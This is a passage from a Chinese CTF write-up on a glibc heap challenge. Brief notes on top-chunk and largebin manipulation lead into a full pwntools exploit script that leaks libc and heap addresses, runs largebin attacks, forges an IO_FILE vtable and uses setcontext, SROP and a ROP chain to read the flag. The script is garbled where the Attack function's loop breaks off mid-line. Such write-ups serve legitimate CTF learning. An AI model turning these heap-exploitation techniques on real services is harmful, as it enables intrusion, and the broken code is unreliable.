合并，之后再申请其中的一部分（小于提前申请的 size），使得新的 top chunk size 能够落在提前申请的空间内，再利用 UAF 就可以修改
top chunk 的 size 了。
这个操作需要注意需要在修改 mp_.tcache_bins 之前完成，因为修改之后再 free 就会直接进入 Tcache 中，而不会认为是
unsortedbin 来进行 unlink。
5.恢复 largebin 信息
在 largebin Attack 后，原来的 largebin 链表被破坏，所以当下次使用的时候就会发生异常导致程序异常退出。所以如果我们需要多次的
largebin Attack，就一定要在攻击之后恢复链表数据，恢复的链表数据可以先把 largebin Attack 需要进行的那行 UAF
修改代码注释掉（不进行 largebin Attack），再调试就可以得到正常情况下的数据。
###  总结
以上部分就是本题中比较新颖的点，其他的利用部分都曾经出现过（例如 orw 的具体利用），我在上文也给出了相应的学习文章，这里就不展开来说。这道题在比赛
Break
环境仅仅三个小时的攻击时间中，居然有人做了出来，实在是佩服。我对于这道题的利用尝试了各个方法，调试了一下午才成功解出，虽然在文章中直接写出的是正解的做法，但是在实际做题中我走了不少的弯路。所以希望各位师傅除了看之外，可以尝试着去做做这道题。
###  EXP
    from pwn import *
    elf = None
    libc = None
    file_name = "./pwn"
    # context.timeout = 1
    def get_file(dic=""):
        context.binary = dic + file_name
        return context.binary
    def get_libc(dic=""):
        libc = None
        try:
            data = os.popen("ldd {}".format(dic + file_name)).read()
            for i in data.split('\n'):
                libc_info = i.split("=>")
                if len(libc_info) == 2:
                    if "libc" in libc_info[0]:
                        libc_path = libc_info[1].split(' (')
                        if len(libc_path) == 2:
                            libc = ELF(libc_path[0].replace(' ', ''), checksec=False)
                            return libc
        except:
            pass
        if context.arch == 'amd64':
            libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
        elif context.arch == 'i386':
            try:
                libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
            except:
                libc = ELF("/lib32/libc.so.6", checksec=False)
        return libc
    def get_sh(Use_other_libc=False, Use_ssh=False):
        global libc
        if args['REMOTE']:
            if Use_other_libc:
                libc = ELF("./libc.so.6", checksec=False)
            if Use_ssh:
                s = ssh(sys.argv[3], sys.argv[1], sys.argv[2], sys.argv[4])
                return s.process(file_name)
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process(file_name)
    def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                    int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if libc == True:
            return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
        elif int_mode:
            return_address = int(sh.recvuntil(end_string, drop=True), 16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
        elif context.arch == 'amd64':
            return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
        else:
            return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.recvrepeat(0.1)
        sh.sendline('cat flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh, gdbscript=None, addr=0, stop=False):
        if args['REMOTE']:
            return
        if gdbscript is not None:
            gdb.attach(sh, gdbscript=gdbscript)
        elif addr is not None:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(sh.pid)).readlines()[1], 16)
            log.success("breakpoint_addr --> " + hex(text_base + addr))
            gdb.attach(sh, 'b *{}'.format(hex(text_base + addr)))
        else:
            gdb.attach(sh)
        if stop:
            raw_input()
    def Attack(target=None, sh=None, elf=None, libc=None):
        if sh is None:
            from Class.Target import Target
            assert target is not None
            assert isinstance(target, Target)
            sh = target.sh
            elf = target.elf
            libc = target.libc
        assert isinstance(elf, ELF)
        assert isinstance(libc, ELF)
        try_count = 0
        while try_count > ", str(idx))
    def add(size, content):
        choice(1)
        sh.sendlineafter("Size: ", str(size))
        sh.sendlineafter("Content: ", str(content))
    def edit(idx, content):
        choice(2)
        sh.sendlineafter("Index: ", str(idx))
        sh.sendlineafter("Content: ", str(content))
    def show(idx):
        choice(4)
        sh.sendlineafter("Index: ", str(idx))
    def delete(idx):
        choice(3)
        sh.sendlineafter("Index: ", str(idx))
    def pwn(sh, elf, libc):
        context.log_level = "debug"
        add(0x418, '0')
        add(0x418, '1')
        add(0x428, '2')
        add(0x428, '3')
        delete(2)
        add(0x450, '4')
        show(2)
        libc_base = get_address(sh, True, info="libc_base:\t", offset=-0x1e3ff0)
        free_hook_addr = libc_base + 0x1e6e40
        setcontext_addr = libc_base + 0x53030
        main_arena_addr = libc_base + 0x1e3ff0
        global_max_fast = libc_base + 0x1e6e98
        mpcount = libc_base + 0x1e32d0
        free_hook_ptr_addr = libc_base + 0x1e2ed8
        stderr_addr = libc_base + 0x1e47a0
        IO_str_jumps = libc_base + 0x1e5580
        delete(0)
        edit(2, p64(main_arena_addr) * 2 + p64(0) + p64(stderr_addr - 0x20))
        add(0x450, '5')
        show(2)
        heap_base = u64(sh.recvuntil('\n', drop=True)[-6:].ljust(8, '\x00')) - 0x2b0
        log.success("heap_base:\t" + hex(heap_base))
        # recover
        edit(2, p64(heap_base + 0x2b0) + p64(main_arena_addr) + p64(heap_base + 0x2b0) + p64(heap_base + 0x2b0))
        edit(0, p64(main_arena_addr) + p64(heap_base + 0xaf0) * 3)
        add(0x418, '6')
        add(0x428, '7')
        add(0x450, '8')
        add(0x450, '9')
        add(0x450, '10')
        delete(8)
        delete(9)
        delete(10)
        delete(7)
        add(0x450, '11')
        edit(7, p64(main_arena_addr) * 2 + p64(0) + p64(mpcount - 0x20) + 'a' * 0x30 + p64(free_hook_addr))
        delete(6)
        add(0x450, '12')
        # recover
        # edit(7, p64(heap_base + 0x2b0) + p64(main_arena_addr) + p64(heap_base + 0x2b0) + p64(heap_base + 0x2b0))
        # edit(6, p64(main_arena_addr) + p64(heap_base + 0xaf0) * 3)
        new_size = 0x1592
        old_blen = (new_size - 100) // 2
        fake_IO_FILE = 2 * p64(0)
        fake_IO_FILE += p64(1)  # change _IO_write_base = 1
        fake_IO_FILE += p64(0xffffffffffff)  # change _IO_write_ptr = 0xffffffffffff
        fake_IO_FILE += p64(0)
        fake_IO_FILE += p64(heap_base + 0x2080)  # _IO_buf_base
        fake_IO_FILE += p64(heap_base + 0x2080 + old_blen)  # _IO_buf_end
        # old_blen = _IO_buf_end - _IO_buf_base
        # new_size = 2 * old_blen + 100;
        fake_IO_FILE = fake_IO_FILE.ljust(0x78, '\x00')
        fake_IO_FILE += p64(heap_base) # change _lock = writable address
        fake_IO_FILE = fake_IO_FILE.ljust(0xB0, '\x00')
        fake_IO_FILE += p64(0)  # change _mode = 0
        fake_IO_FILE = fake_IO_FILE.ljust(0xC8, '\x00')
        fake_IO_FILE += p64(IO_str_jumps + 0x18 - 0x38)  # change vtable
        edit(6, fake_IO_FILE)
        edit(0, '\x01')
        # heap_base + 0x2080
        gadget_addr = libc_base + 0x000000000014b760  #: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
        pop_rdi_addr = libc_base + 0x2858f
        pop_rsi_addr = libc_base + 0x2ac3f
        pop_rdx_addr = libc_base + 0x5216
        pop_rax_addr = libc_base + 0x45580
        syscall_addr = libc_base + 0x611ea
        # SROP
        fake_frame_addr = heap_base + 0x2080
        frame = SigreturnFrame()
        frame.rax = 2
        frame.rdi = fake_frame_addr + 0xF8
        frame.rsi = 0
        frame.rdx = 0x100
        frame.rsp = fake_frame_addr + 0xF8 + 0x10
        frame.rip = pop_rdi_addr + 1  # : ret
        rop_data = [
            pop_rax_addr,  # sys_open('flag', 0)
            2,
            syscall_addr,
            pop_rax_addr,  # sys_read(flag_fd, heap, 0x100)
            0,
            pop_rdi_addr,
            3,
            pop_rsi_addr,
            fake_frame_addr + 0x200,
            syscall_addr,
            pop_rax_addr,  # sys_write(1, heap, 0x100)
            1,
            pop_rdi_addr,
            1,
            pop_rsi_addr,
            fake_frame_addr + 0x200,
            syscall_addr
        ]
        payload = (p64(gadget_addr) + p64(fake_frame_addr) + p64(0) * 2 + p64(setcontext_addr + 61) +
                   str(frame)[ 0x28:]).ljust(0xF8, '\x00') + "flag\x00\x00\x00\x00" + p64(0) + flat(rop_data)
        edit(9, payload)
        add(0x430, '13')
        edit(10, 'a' * 0x438 + p64(0x3fe))
        #gdb.attach(sh, "b *__vfprintf_internal+273")
        choice(1)
        sh.sendlineafter("Size: ", str(0x440))
        sh.interactive()
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(sh=sh, elf=get_file(), libc=get_libc())
        sh.close()
        log.success('The flag is ' + re.search(r'flag{.+}', flag).group())
## 总结
这次比赛的 Break 环节的题目的质量都非常的高，可惜占比很小，虽然从 Writeup
看来有些题目的利用非常的简单。但实际上很大的难度都在于逆向分析上，这里不知道是专家的选择是有意还是无意的，选择的题目都是偏向于 C++
的或者有混淆的题目，这类题目的逆向难度大，难以找到漏洞利用点。在比赛紧张的气氛下，在比赛 3
小时的时间内完成一题都是非常了不得的。我的解题方法只代表的我个人的一种思路，如果有更好的思路或者非预期的解法，希望各位师傅不要吝啬，可以在评论区分享一下~